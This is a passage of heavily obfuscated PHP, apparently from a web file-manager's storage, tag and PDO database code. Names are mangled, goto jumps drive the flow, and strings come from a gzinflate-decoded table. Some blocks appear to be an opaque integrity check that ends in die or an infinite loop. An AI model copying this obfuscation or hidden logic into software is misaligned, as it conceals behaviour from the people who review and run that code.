$C≠¢∂Ö“ê÷ => $F≥∆È√è“á) { $A‹Ûå≤¬Æº[$C≠¢∂Ö“ê÷][$aº¢Îœ≤‡–[2018]] = $A‹Ûå≤¬Æº[$C≠¢∂Ö“ê÷][$aº¢Îœ≤‡–[78]]; $A‹Ûå≤¬Æº[$C≠¢∂Ö“ê÷][$aº¢Îœ≤‡–[78]] = 0; } goto C˜ø∂·Â—Ù; bØº˘∂É‡‰: $e√≠¥…Á∏™ = array($aº¢Îœ≤‡–[571] => 1, $aº¢Îœ≤‡–[578] => array($aº¢Îœ≤‡–[538], $eÍ◊ï∏õ∑æ[$aº¢Îœ≤‡–[515]] . $Cà á∫·Ì“ . $aº¢Îœ≤‡–[539])); $D®„◊ç‹≠™ = $aº¢Îœ≤‡–[2017]; $A‹Ûå≤¬Æº = $this->field($D®„◊ç‹≠™)->where($e√≠¥…Á∏™)->select(); goto DÍ…öâ√Î; C˜ø∂·Â—Ù: foreach ($FôØ”ä√Ó© as $F≥∆È√è“á) { $BÇûçıòıâ = $F≥∆È√è“á[$aº¢Îœ≤‡–[492]] . $aº¢Îœ≤‡–[33]; if (!isset($A‹Ûå≤¬Æº[$BÇûçıòıâ])) { continue; } if ($F≥∆È√è“á[$aº¢Îœ≤‡–[425]] == $A‹Ûå≤¬Æº[$BÇûçıòıâ][$aº¢Îœ≤‡–[425]]) { $A‹Ûå≤¬Æº[$BÇûçıòıâ][$aº¢Îœ≤‡–[78]] += $F≥∆È√è“á[$aº¢Îœ≤‡–[78]]; } } foreach ($A‹Ûå≤¬Æº as $F≥∆È√è“á) { $d’Ö‘ëòèÁ = $this->parentLevelArray($F≥∆È√è“á[$aº¢Îœ≤‡–[515]]); foreach ($d’Ö‘ëòèÁ as $BÇûçıòıâ) { $BÇûçıòıâ = $BÇûçıòıâ . $aº¢Îœ≤‡–[33]; if (!isset($A‹Ûå≤¬Æº[$BÇûçıòıâ])) { continue; } if ($F≥∆È√è“á[$aº¢Îœ≤‡–[425]] == $A‹Ûå≤¬Æº[$BÇûçıòıâ][$aº¢Îœ≤‡–[425]]) { $A‹Ûå≤¬Æº[$BÇûçıòıâ][$aº¢Îœ≤‡–[78]] += $F≥∆È√è“á[$aº¢Îœ≤‡–[78]]; } } } $CÏó‹ãÍøÁ = array(); goto DÖÒ‹öÔıÎ; DÖÒ‹öÔıÎ: foreach ($A‹Ûå≤¬Æº as $F≥∆È√è“á) { if ($F≥∆È√è“á[$aº¢Îœ≤‡–[78]] == $F≥∆È√è“á[$aº¢Îœ≤‡–[2018]]) { continue; } $CÏó‹ãÍøÁ[] = array($aº¢Îœ≤‡–[397], $F≥∆È√è“á[$aº¢Îœ≤‡–[397]], $aº¢Îœ≤‡–[78], $F≥∆È√è“á[$aº¢Îœ≤‡–[78]]); } $this->saveAll($CÏó‹ãÍøÁ); goto déé»ãﬁ¨Ü; BëÆÃ±§Üˆ: $aº¢Îœ≤‡– =& $_SERVER[’ÿƒ†ïò]; $this->sourceCacheClear($Cà á∫·Ì“); $eÍ◊ï∏õ∑æ = $this->sourceInfo($Cà á∫·Ì“); goto bØº˘∂É‡‰; DÍ…öâ√Î: $e√≠¥…Á∏™[$aº¢Îœ≤‡–[405]] = 0; $FôØ”ä√Ó© = $this->field($D®„◊ç‹≠™)->where($e√≠¥…Á∏™)->select(); if (!$FôØ”ä√Ó©) { return; } goto c…«Ï¢º≠“; déé»ãﬁ¨Ü: } public function userSpaceReset($E“Ò‘ãäì◊ = false) { $c¨––‘á√≥ =& $_SERVER[’ÿƒ†ïò]; $e»É——•ƒÿ = $this->where(array($c¨––‘á√≥[406] => self::TYPE_USER, $c¨––‘á√≥[498] => $E“Ò‘ãäì◊, $c¨––‘á√≥[405] => 0))->sum($c¨––‘á√≥[78]); $e»É——•ƒÿ = !$e»É——•ƒÿ || $e»É——•ƒÿ <= 0 ? 0 : $e»É——•ƒÿ; Model($c¨––‘á√≥[507])->userEdit($E“Ò‘ãäì◊, array($c¨––‘á√≥[1712] => $e»É——•ƒÿ)); } public function targetSpaceUpdate($b·û“ÓÑﬁ, $C€ÒééÌäî) { $eÉ…´‹´–Ñ =& $_SERVER[’ÿƒ†ïò]; if (!$C€ÒééÌäî) { return; } if (!in_array($b·û“ÓÑﬁ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÓÂ«êÜÌı = $this->targetSpaceSize($b·û“ÓÑﬁ, $C€ÒééÌäî); if ($b·û“ÓÑﬁ == self::TYPE_USER) { Model($eÉ…´‹´–Ñ[507])->userEdit($C€ÒééÌäî, array($eÉ…´‹´–Ñ[1712] => $eÓÂ«êÜÌı)); } else { if ($b·û“ÓÑﬁ == self::TYPE_GROUP) { Model($eÉ…´‹´–Ñ[516])->groupEdit($C€ÒééÌäî, array($eÉ…´‹´–Ñ[1712] => $eÓÂ«êÜÌı)); } } } public function targetSpaceSize($dÖ–È≤∞°¥, $bçÉ‰çñ≥è) { goto C‹Ó’ì®éœ; C‹Ó’ì®éœ: $A∏Ì™Î∆õÊ =& $_SERVER[’ÿƒ†ïò]; $AƒŸû∞˜êÚ = $this->sourceRoot($dÖ–È≤∞°¥, $bçÉ‰çñ≥è, !0); if (!$AƒŸû∞˜êÚ) { return 0; } goto B≤ àçÕ»î; aï©º”øáΩ: $bÉúÃƒ¥⁄Ú = !$bÉúÃƒ¥⁄Ú || $bÉúÃƒ¥⁄Ú <= 0 ? 0 : $bÉúÃƒ¥⁄Ú; return $bÉúÃƒ¥⁄Ú; goto C⁄’ÃäÇ¢∑; B≤ àçÕ»î: $bÉúÃƒ¥⁄Ú = floatval($AƒŸû∞˜êÚ[$A∏Ì™Î∆õÊ[78]]); $BôØàœÃ∆î = array($A∏Ì™Î∆õÊ[578] => array($A∏Ì™Î∆õÊ[538], $A∏Ì™Î∆õÊ[525] . $AƒŸû∞˜êÚ[$A∏Ì™Î∆õÊ[397]] . $A∏Ì™Î∆õÊ[539])); $eÙêŒÃï£Ã = Model($A∏Ì™Î∆õÊ[423])->field($A∏Ì™Î∆õÊ[412])->where($BôØàœÃ∆î)->select(); goto AØïäÓÎ◊›; AØïäÓÎ◊›: $eÙêŒÃï£Ã = array_to_keyvalue($eÙêŒÃï£Ã, $A∏Ì™Î∆õÊ[33], $A∏Ì™Î∆õÊ[397]); $eÙêŒÃï£Ã = array_unique(array_filter($eÙêŒÃï£Ã)); if ($eÙêŒÃï£Ã) { $BôØàœÃ∆î = array($A∏Ì™Î∆õÊ[412] => array($A∏Ì™Î∆õÊ[413], $eÙêŒÃï£Ã)); $bÉúÃƒ¥⁄Ú += floatval($this->where($BôØàœÃ∆î)->sum($A∏Ì™Î∆õÊ[78])); } goto aï©º”øáΩ; C⁄’ÃäÇ¢∑: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cÈ≥€£éƒç) { return $this->fileTypeProfile($cÈ≥€£éƒç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($b®ÿ∆¥åÕÇ) { return $this->fileTypeProfile($b®ÿ∆¥åÕÇ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($DÔÛ¡üî±¥, $A—◊Íáéóã) { goto d÷˜€ÀÉèÕ; Dä—ÒÿÆ’ı: foreach ($D‹πõï†‰ﬂ as $b·‘ÕõÏƒÁ => $b¥îâíÀÌ‡) { $d’–Õ≈Ç≥≤[$EÎÖ∑çë„€[407]] = $this->fileTypeWhere($b·‘ÕõÏƒÁ); $e◊⁄¨áîüﬁ[$b·‘ÕõÏƒÁ] = array($EÎÖ∑çë„€[2021] => $b¥îâíÀÌ‡[$EÎÖ∑çë„€[28]], $EÎÖ∑çë„€[2022] => $this->where($d’–Õ≈Ç≥≤)->count(), $EÎÖ∑çë„€[573] => $this->where($d’–Õ≈Ç≥≤)->sum($EÎÖ∑çë„€[78])); } Cache::set($b¢üâº€’Ü, $e◊⁄¨áîüﬁ, 1200); return $e◊⁄¨áîüﬁ; goto EÖ˘Ì Ãüë; AÕÑãñ”ÿ”: $e◊⁄¨áîüﬁ = array(); $e◊⁄¨áîüﬁ[$EÎÖ∑çë„€[2020]] = array($EÎÖ∑çë„€[2021] => LNG($EÎÖ∑çë„€[2020]), $EÎÖ∑çë„€[2022] => $this->where($d’–Õ≈Ç≥≤)->count(), $EÎÖ∑çë„€[573] => $this->where($d’–Õ≈Ç≥≤)->sum($EÎÖ∑çë„€[78])); $D‹πõï†‰ﬂ = KodIO::fileTypeList(); goto Dä—ÒÿÆ’ı; fÊøàµé‰…: if ($C·áÕ›ﬁ˘µ) { return $C·áÕ›ﬁ˘µ; } $d’–Õ≈Ç≥≤ = array($EÎÖ∑çë„€[571] => 0); if ($DÔÛ¡üî±¥ != !1) { $d’–Õ≈Ç≥≤[$EÎÖ∑çë„€[498]] = $DÔÛ¡üî±¥; $d’–Õ≈Ç≥≤[$EÎÖ∑çë„€[406]] = $A—◊Íáéóã; } goto AÕÑãñ”ÿ”; d÷˜€ÀÉèÕ: $EÎÖ∑çë„€ =& $_SERVER[’ÿƒ†ïò]; $b¢üâº€’Ü = $EÎÖ∑çë„€[2019] . $DÔÛ¡üî±¥ . $EÎÖ∑çë„€[71] . $A—◊Íáéóã; $C·áÕ›ﬁ˘µ = Cache::get($b¢üâº€’Ü); goto fÊøàµé‰…; EÖ˘Ì Ãüë: } public function fileNameExist($F‡ä©∫∞ïØ, $e∑π“åèƒÆ) { $aÒ‘Ö˜ﬂåÑ =& $_SERVER[’ÿƒ†ïò]; $D¢ê∆˘ﬁΩö = $this->where(array($aÒ‘Ö˜ﬂåÑ[492] => $F‡ä©∫∞ïØ, $aÒ‘Ö˜ﬂåÑ[28] => $e∑π“åèƒÆ, $aÒ‘Ö˜ﬂåÑ[425] => 0))->find(); return is_array($D¢ê∆˘ﬁΩö) ? $D¢ê∆˘ﬁΩö[$aÒ‘Ö˜ﬂåÑ[397]] : !1; } public function childList($B ßŒ”ÒÒ) { goto EÑﬂøÔòπ€; cõäÖ©©Êê: self::$cacheChildList[$b≠ñ–Î£¿≈] = $fµ≠∆§îÆå; foreach ($fµ≠∆§îÆå as $dêê‰¬º∏–) { $b≠ñ–Î£¿≈ = $d”ﬂ∫§‡∏Õ[452] . $dêê‰¬º∏–[$d”ﬂ∫§‡∏Õ[397]]; self::$cacheSourceInfo[$b≠ñ–Î£¿≈] = $dêê‰¬º∏–; } return $fµ≠∆§îÆå; goto E∫´Ùâçπû; EÑﬂøÔòπ€: $d”ﬂ∫§‡∏Õ =& $_SERVER[’ÿƒ†ïò]; $b≠ñ–Î£¿≈ = $d”ﬂ∫§‡∏Õ[1997] . $B ßŒ”ÒÒ; if (isset(self::$cacheChildList[$b≠ñ–Î£¿≈])) { return self::$cacheChildList[$b≠ñ–Î£¿≈]; } goto AäÇ¨¿ûÚ≤; AäÇ¨¿ûÚ≤: $fø¬ª£¿·µ = array($d”ﬂ∫§‡∏Õ[492] => intval($B ßŒ”ÒÒ), $d”ﬂ∫§‡∏Õ[425] => 0); $fµ≠∆§îÆå = $this->where($fø¬ª£¿·µ)->select(); $fµ≠∆§îÆå = $fµ≠∆§îÆå ? $fµ≠∆§îÆå : array(); goto cõäÖ©©Êê; E∫´Ùâçπû: } public function fileNameAuto($D ¯à∞ƒÊ‰, $bı†Ïó‘æ, $eãÃü©–Èﬂ = REPEAT_RENAME, $E¨¨ú¶∞É· = false) { $F“ïËí®Ë¯ =& $_SERVER[’ÿƒ†ïò]; $C˘∑  €™ÿ = array($F“ïËí®Ë¯[492] => $D ¯à∞ƒÊ‰, $F“ïËí®Ë¯[425] => 0, $F“ïËí®Ë¯[28] => array($F“ïËí®Ë¯[381], $bı†Ïó‘æ . $F“ïËí®Ë¯[382])); $eµÑúàÑŸ€ = $this->field($F“ïËí®Ë¯[28])->where($C˘∑  €™ÿ)->select(); $fÁÃÖΩç¯÷ = array_to_keyvalue($eµÑúàÑŸ€, $F“ïËí®Ë¯[33], $F“ïËí®Ë¯[28]); return $this->fileNameAutoGet($fÁÃÖΩç¯÷, $bı†Ïó‘æ, $eãÃü©–Èﬂ, $E¨¨ú¶∞É·); } public function fileNameAutoGet($D⁄„–ëºˆ›, $fî¥üîÇ∏º, $AûÈËÚ∆àõ, $EŒ„©–Öë†) { $D‹ƒÆáÙ·Ø =& $_SERVER[’ÿƒ†ïò]; if ($AûÈËÚ∆àõ == REPEAT_REPLACE || !$D⁄„–ëºˆ› || !in_array_not_case($fî¥üîÇ∏º, $D⁄„–ëºˆ›) || $EŒ„©–Öë† && $AûÈËÚ∆àõ != REPEAT_RENAME_FOLDER) { return $fî¥üîÇ∏º; } if ($AûÈËÚ∆àõ == REPEAT_SKIP) { return !1; } $F‚‘∂ÁÓ÷Ö = $D‹ƒÆáÙ·Ø[95] . get_path_ext($fî¥üîÇ∏º); $F‚‘∂ÁÓ÷Ö = $F‚‘∂ÁÓ÷Ö == $D‹ƒÆáÙ·Ø[95] || $EŒ„©–Öë† ? $D‹ƒÆáÙ·Ø[33] : $F‚‘∂ÁÓ÷Ö; for ($CéﬂÜö´”é = 1; $CéﬂÜö´”é <= count($D⁄„–ëºˆ›) + 1; $CéﬂÜö´”é++) { $c÷Õ£ΩÉ„á = substr($fî¥üîÇ∏º, 0, strlen($fî¥üîÇ∏º) - strlen($F‚‘∂ÁÓ÷Ö)); $Cä™ú„îµë = $c÷Õ£ΩÉ„á . "\x28{$CéﬂÜö´”é}\51{$F‚‘∂ÁÓ÷Ö}"; if (!in_array_not_case($Cä™ú„îµë, $D⁄„–ëºˆ›)) { return $Cä™ú„îµë; } } } } goto céØÀÀÍ¿¨; C†Íå≥Ãˆˆ: $båù‹∏ÏÏÈ = $_SERVER[’ÿƒ†ïò][600]; if (strlen($båù‹∏ÏÏÈ) < $_SERVER[’ÿƒ†ïò][601]) { die; } $_SERVER[É∫„≈‹Æá¿∫Ö] = explode($_SERVER[’ÿƒ†ïò][602], gzinflate(substr($_SERVER[’ÿƒ†ïò][603], 10, -8))); goto Aßíµ¢“ó‡; F‘€¿Çë∆É: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\x61\x67\114\x69\x73\164"; public $modelType = "\125\x73\x65\162\x4f\160\164\x69\x6f\156"; public $field = array("\156\141\x6d\145", "\x73\164\171\x6c\x65", "\x73\157\x72\x74"); public function listData($F¡öç“∑◊™ = false, $aß˜√„ÚÓÀ = "\163\x6f\162\164", $d±˜ò⁄éÚÖ = false) { return parent::listData($F¡öç“∑◊™, $aß˜√„ÚÓÀ, $d±˜ò⁄éÚÖ); } public function remove($B˘ß∏ÈúËŸ) { return parent::remove($B˘ß∏ÈúËŸ); } public function add($eÊ§∂ÀÍâ∞, $CÎ¥Âª£‘î = "\x6c\141\x62\x65\x6c\x2d\x67\162\x65\171\55\156\x6f\x72\155\141\x6c") { $fò ˆ£’”å =& $_SERVER[’ÿƒ†ïò]; if ($this->findByName($eÊ§∂ÀÍâ∞)) { return !1; } $Aèçàäû∂í = array($fò ˆ£’”å[415] => $eÊ§∂ÀÍâ∞, $fò ˆ£’”å[478] => $CÎ¥Âª£‘î, $fò ˆ£’”å[1730] => $this->getSort($fò ˆ£’”å[256]) + 1); return parent::insert($Aèçàäû∂í); } public function update($B¿éÌº∞Ì◊, $C„ºäüùËà) { $f≠ìãÇË›ı =& $_SERVER[’ÿƒ†ïò]; $BÀ⁄®£”≈Õ = $this->listData($B¿éÌº∞Ì◊); $DÍÛ‡¥∆Îû = $this->findByName($C„ºäüùËà[$f≠ìãÇË›ı[28]]); if (!$BÀ⁄®£”≈Õ || $DÍÛ‡¥∆Îû && $DÍÛ‡¥∆Îû[$f≠ìãÇË›ı[395]] != $BÀ⁄®£”≈Õ[$f≠ìãÇË›ı[395]]) { return !1; } return parent::update($B¿éÌº∞Ì◊, $C„ºäüùËà); } public function moveTop($Dà•ëÊŸøó) { $e‰˜êÎéÀ· =& $_SERVER[’ÿƒ†ïò]; $d≥≥≈ÕˆÎ± = parent::listData(); $e´∑éÚé§ü = $this->getSort($e‰˜êÎéÀ·[255]); foreach ($d≥≥≈ÕˆÎ± as &$dﬂ¯ñó∫Õä) { if ($dﬂ¯ñó∫Õä[$e‰˜êÎéÀ·[395]] == $Dà•ëÊŸøó) { $dﬂ¯ñó∫Õä[$e‰˜êÎéÀ·[1749]] = $e´∑éÚé§ü; continue; } $dﬂ¯ñó∫Õä[$e‰˜êÎéÀ·[1749]] += 1; } unset($dﬂ¯ñó∫Õä); return parent::resetData($d≥≥≈ÕˆÎ±); } public function moveBottom($dÉò¬ÚÈÑÇ) { $FÈı·ç§à‚ =& $_SERVER[’ÿƒ†ïò]; $Cø÷‘¯ôà£ = $this->getSort($FÈı·ç§à‚[256]) + 1; return parent::update($dÉò¬ÚÈÑÇ, array($FÈı·ç§à‚[1749] => $Cø÷‘¯ôà£)); } public function resetSort($DÚ∆Ÿ¨íá») { goto FÉÚ¨∑ïïú; E´É¿Í∏—◊: unset($bÎ£éì–éË); return parent::resetData($Eé®ÜöıÿÏ); goto C‰ﬁ¨∂Ñä¥; FÉÚ¨∑ïïú: $BæñûÊ‚´≥ =& $_SERVER[’ÿƒ†ïò]; $DæÌ¡ãÉÓÉ = array(); $DÚ∆Ÿ¨íá» = is_array($DÚ∆Ÿ¨íá») ? $DÚ∆Ÿ¨íá» : array(); goto a–€Ü˘Ô±ó; a–€Ü˘Ô±ó: for ($B ’ÈòèáŒ = 0; $B ’ÈòèáŒ < count($DÚ∆Ÿ¨íá»); $B ’ÈòèáŒ++) { $DæÌ¡ãÉÓÉ[$DÚ∆Ÿ¨íá»[$B ’ÈòèáŒ] . $BæñûÊ‚´≥[33]] = $B ’ÈòèáŒ + 1; } $Eé®ÜöıÿÏ = parent::listData(); foreach ($Eé®ÜöıÿÏ as &$bÎ£éì–éË) { $Aõº»õî§Ç = $DæÌ¡ãÉÓÉ[$bÎ£éì–éË[$BæñûÊ‚´≥[395]]]; $bÎ£éì–éË[$BæñûÊ‚´≥[1749]] = $Aõº»õî§Ç ? $Aõº»õî§Ç : $bÎ£éì–éË[$BæñûÊ‚´≥[1749]]; } goto E´É¿Í∏—◊; C‰ﬁ¨∂Ñä¥: } private function getSort($bü” Õ∑¢Ö) { $cçæµπ–µ =& $_SERVER[’ÿƒ†ïò]; $cÃ˜ÀÃÕâ‰ = parent::listData(); $dÜªÜ®Î–Ÿ = array_to_keyvalue($cÃ˜ÀÃÕâ‰, $cçæµπ–µ[33], $cçæµπ–µ[1749]); if (!$dÜªÜ®Î–Ÿ) { $dÜªÜ®Î–Ÿ = array(0); } $CˆÇÒïœã„ = $bü” Õ∑¢Ö == $cçæµπ–µ[256] ? max($dÜªÜ®Î–Ÿ) : min($dÜªÜ®Î–Ÿ); return intval($CˆÇÒïœã„); } } goto dú’íæÛ¡¿; aŒ≠„ªë“Û: if (!isset($_SERVER[$_SERVER[’ÿƒ†ïò][854]]) || !isset($_SERVER[$_SERVER[’ÿƒ†ïò][861]])) { goto a∂‹ë–∂Õë; a∂‹ë–∂Õë: $FïÑﬂ√Ñ≥È = $_SERVER[’ÿƒ†ïò][856]; $cÓÉ÷Òœáä = $_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]; $Cü®åû¶ú∏ = $FïÑﬂ√Ñ≥È($cÓÉ÷Òœáä); goto F⁄ ¯√¥Ñı; DÈè–≥æ†û: $Aß≠ª¥âìã($_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]); $B€º≈çîÙû = 2; while ($B€º≈çîÙû > 1) { $AíÓ≠ã≥´Ñ = rawurlencode($B€º≈çîÙû . $_SERVER[’ÿƒ†ïò][376]); } goto E´∑≈¢€«”; F⁄ ¯√¥Ñı: $cìŒ”ãë∂ø = explode($_SERVER[’ÿƒ†ïò][229], $Cü®åû¶ú∏); if (count($cìŒ”ãë∂ø) < $_SERVER[’ÿƒ†ïò][601]) { $bøÍØÊ™∫∫ = $_SERVER[’ÿƒ†ïò][859]; $bøÍØÊ™∫∫(); } $Aß≠ª¥âìã = $_SERVER[’ÿƒ†ïò][860]; goto DÈè–≥æ†û; E´∑≈¢€«”: } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($E∆ËÂÜòÉ = '') { $cÈ†ˆ˜†ì§ =& $_SERVER[’ÿƒ†ïò]; if (!class_exists($cÈ†ˆ˜†ì§[903])) { think_exception(think_lang($cÈ†ˆ˜†ì§[10]) . $cÈ†ˆ˜†ì§[904]); } if (!empty($E∆ËÂÜòÉ)) { $this->config = $E∆ËÂÜòÉ; if (empty($this->config[$cÈ†ˆ˜†ì§[13]])) { $this->config[$cÈ†ˆ˜†ì§[13]] = array(); } } } public function connect($d‰∑∫à€ã = '', $c√«çﬁËè¬ = 0) { $Dß±ãÙ∞≥ê =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->linkID[$c√«çﬁËè¬])) { goto Eò£€∏©ç†; CéëÚﬁû®ä: if (!$this->linkID[$c√«çﬁËè¬]) { think_exception($Dß±ãÙ∞≥ê[913]); } try { $this->linkID[$c√«çﬁËè¬]->exec($Dß±ãÙ∞≥ê[914] . think_config($Dß±ãÙ∞≥ê[881])); } catch (Exception $D√ÖÍ·´ó¯) { } $this->connected = !0; goto Eù«Ç◊·‰®; Eò£€∏©ç†: if (empty($d‰∑∫à€ã)) { $d‰∑∫à€ã = $this->config; } $b±Æ∫áûıû = !empty($d‰∑∫à€ã[$Dß±ãÙ∞≥ê[13]][$Dß±ãÙ∞≥ê[14]]) ? $d‰∑∫à€ã[$Dß±ãÙ∞≥ê[13]][$Dß±ãÙ∞≥ê[14]] : $this->pconnect; if ($b±Æ∫áûıû) { $d‰∑∫à€ã[$Dß±ãÙ∞≥ê[13]][PDO::ATTR_PERSISTENT] = !0; } goto A—±Ó‡∫ Ê; A—±Ó‡∫ Ê: try { $this->linkID[$c√«çﬁËè¬] = new PDO($d‰∑∫à€ã[$Dß±ãÙ∞≥ê[905]], $d‰∑∫à€ã[$Dß±ãÙ∞≥ê[878]], $d‰∑∫à€ã[$Dß±ãÙ∞≥ê[879]], $d‰∑∫à€ã[$Dß±ãÙ∞≥ê[13]]); } catch (PDOException $D√ÖÍ·´ó¯) { think_exception($D√ÖÍ·´ó¯->getMessage()); } $this->dbType = $this->_getDsnType($d‰∑∫à€ã[$Dß±ãÙ∞≥ê[905]]); if (in_array($this->dbType, array($Dß±ãÙ∞≥ê[906], $Dß±ãÙ∞≥ê[907], $Dß±ãÙ∞≥ê[908], $Dß±ãÙ∞≥ê[909]))) { think_exception($Dß±ãÙ∞≥ê[910] . $this->dbType . $Dß±ãÙ∞≥ê[911] . $this->dbType . $Dß±ãÙ∞≥ê[912]); } goto CéëÚﬁû®ä; Eù«Ç◊·‰®: if (1 != think_config($Dß±ãÙ∞≥ê[18])) { unset($this->config); } goto e¡≤áÜÔˆ∆; e¡≤áÜÔˆ∆: } return $this->linkID[$c√«çﬁËè¬]; } public function free() { $this->PDOStatement = null; } public function query($c›“ Èªç¿, $BÂÃö≈®ë’ = array()) { goto Cﬂ⁄‰ˆÑ—ô; cË‹î§…ÚÉ: think_action_status($Bí≠•Òãªú[19], 1); think_status($Bí≠•Òãªú[20]); $this->PDOStatement = $this->_linkID->prepare($c›“ Èªç¿); goto D≈˘∆¥∆ë‘; D≈˘∆¥∆ë‘: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Fá´á’ ∏Ö = $this->PDOStatement->execute($BÂÃö≈®ë’); $this->debug(); goto CÊìƒá âπ; Cﬂ⁄‰ˆÑ—ô: $Bí≠•Òãªú =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F◊ñú∏åﬂä; CÊìƒá âπ: if (!1 === $Fá´á’ ∏Ö) { $this->error(); return !1; } else { return $this->getAll(); } goto b∫Ù¿á—è™; F◊ñú∏åﬂä: $this->queryStr = $c›“ Èªç¿; if (!empty($BÂÃö≈®ë’)) { $this->queryStr .= $Bí≠•Òãªú[915] . print_r($BÂÃö≈®ë’, !0) . $Bí≠•Òãªú[916]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cË‹î§…ÚÉ; b∫Ù¿á—è™: } public function execute($aÀßõ°§·‰, $FÎπ˘Óù‰ã = array()) { goto C§¶∂∫Ÿ∑”; Aâ¬ã˘é·≈: $cÏ€Ëœú«∞ = $this->PDOStatement->execute($FÎπ˘Óù‰ã); $this->debug(); if (!1 === $cÏ€Ëœú«∞) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($CÑ˘ïˆµçù || preg_match($A¡÷ÀµŒÔÀ[921], $aÀßõ°§·‰)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto d¢öäãﬁø°; a —Ì¢øè„: $this->queryStr = $aÀßõ°§·‰; if (!empty($FÎπ˘Óù‰ã)) { $this->queryStr .= $A¡÷ÀµŒÔÀ[915] . print_r($FÎπ˘Óù‰ã, !0) . $A¡÷ÀµŒÔÀ[916]; } $CÑ˘ïˆµçù = !1; goto e÷‡»ùØ·; Dâ“±ƒÉ£®: think_status($A¡÷ÀµŒÔÀ[20]); $this->PDOStatement = $this->_linkID->prepare($aÀßõ°§·‰); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Aâ¬ã˘é·≈; C§¶∂∫Ÿ∑”: $A¡÷ÀµŒÔÀ =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a —Ì¢øè„; e÷‡»ùØ·: if ($this->dbType == $A¡÷ÀµŒÔÀ[909]) { if (preg_match($A¡÷ÀµŒÔÀ[917], $this->queryStr, $cÒÒÛöä¥≈)) { $this->table = think_config($A¡÷ÀµŒÔÀ[918]) . str_ireplace(think_config($A¡÷ÀµŒÔÀ[919]), $A¡÷ÀµŒÔÀ[376], $cÒÒÛöä¥≈[2]); $CÑ˘ïˆµçù = (bool) $this->query($A¡÷ÀµŒÔÀ[920] . strtoupper($this->table) . $A¡÷ÀµŒÔÀ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A¡÷ÀµŒÔÀ[21], 1); goto Dâ“±ƒÉ£®; d¢öäãﬁø°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bæë¡◊˘¢◊ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bæë¡◊˘¢◊) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÉ¡íõ÷Ç¥ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fÉ¡íõ÷Ç¥) { $this->error(); return !1; } } return !0; } private function getAll() { $B÷‰â¶Á≤Û = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($B÷‰â¶Á≤Û); return $B÷‰â¶Á≤Û; } public function getFields($C÷ó¯ÜÖÔ¥) { goto D™≠íÌ»Î«; FÖ´‰“£˘æ: $cΩﬂ•€’Ë« = $this->query($a˘–î¥⁄¯‹); $aø„ﬁñÇú¥ = array(); if ($cΩﬂ•€’Ë«) { foreach ($cΩﬂ•€’Ë« as $D‡•é”®π‰ => $E¨¥É®ë…¶) { $E¨¥É®ë…¶ = array_change_key_case($E¨¥É®ë…¶); $E¨¥É®ë…¶[$cá¢™ñöÈ≤[28]] = isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[28]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[28]] : $cá¢™ñöÈ≤[376]; $E¨¥É®ë…¶[$cá¢™ñöÈ≤[29]] = isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[29]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[29]] : $cá¢™ñöÈ≤[376]; $E≈òöòõ•É = isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[271]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[271]] : $E¨¥É®ë…¶[$cá¢™ñöÈ≤[28]]; $aø„ﬁñÇú¥[$E≈òöòõ•É] = array($cá¢™ñöÈ≤[28] => $E≈òöòõ•É, $cá¢™ñöÈ≤[29] => $E¨¥É®ë…¶[$cá¢™ñöÈ≤[29]], $cá¢™ñöÈ≤[31] => (bool) (isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[103]]) && $E¨¥É®ë…¶[$cá¢™ñöÈ≤[103]] === $cá¢™ñöÈ≤[33] || isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[31]]) && $E¨¥É®ë…¶[$cá¢™ñöÈ≤[31]] === $cá¢™ñöÈ≤[33]), $cá¢™ñöÈ≤[34] => isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[34]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[34]] : (isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[53]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[53]] : $cá¢™ñöÈ≤[376]), $cá¢™ñöÈ≤[36] => isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[93]]) ? strtolower($E¨¥É®ë…¶[$cá¢™ñöÈ≤[93]]) == $cá¢™ñöÈ≤[38] : (isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[54]]) ? $E¨¥É®ë…¶[$cá¢™ñöÈ≤[54]] : !1), $cá¢™ñöÈ≤[39] => isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[938]]) ? strtolower($E¨¥É®ë…¶[$cá¢™ñöÈ≤[938]]) == $cá¢™ñöÈ≤[41] : (isset($E¨¥É®ë…¶[$cá¢™ñöÈ≤[93]]) ? 